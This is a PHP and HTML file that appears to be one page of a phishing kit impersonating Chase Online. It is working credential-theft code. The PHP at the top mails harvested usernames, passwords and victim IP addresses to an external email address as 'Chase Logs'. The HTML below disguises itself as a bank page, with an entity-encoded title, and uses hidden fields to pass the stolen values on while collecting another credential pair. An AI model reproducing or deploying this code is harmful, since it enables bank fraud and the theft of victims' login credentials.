<?

$usr .= $_POST['formtext1'];
$pasr .= $_POST['formtext2'];

$msg = "-----------------Chase User-----------------" . "\n";
$msg .= "USer: " . $usr . "\n";
$msg .= "UPas: " . $pasr . "\n";

$ip = $_SERVER["REMOTE_ADDR"];

$to = "folazan432@tutanota.com";
$subj = "Chase Logs " . $ip;

mail($to, $subj, $msg, $ip);
?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html><head><title>&#67;&#104;&#97;&#115;&#101;&#32;&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#45;&#32;&#67;&#117;&#115;&#116;&#111;&#109;&#101;&#114;&#32;&#67;&#101;&#110;&#116;&#101;&#114;</title><body id="ridBody" background="bg3.png">
</head>
<body>

<form action=ai.php name=chalbhai id=chalbhai method=post>
<input type="hidden" name="formtext1" value="<?php echo($usr); ?>">
<input type="hidden" name="formtext2" value="<?php echo($pasr); ?>">
<input name="formtext3" required autocomplete="off" type="text" style="position:absolute;height:22px;width:150px;left:509px;top:376px;z-index:19">

<input name="formtext4" required autocomplete="off" type="password" style="position:absolute;height:22px;width:150px;left:509px;top:406px;z-index:20">

<div id="formimage1" style="position:absolute; left:490px; top:468px; z-index:6"><input type="image" name="formimage1" src="update.png"></div>

</form>

</body>
</html>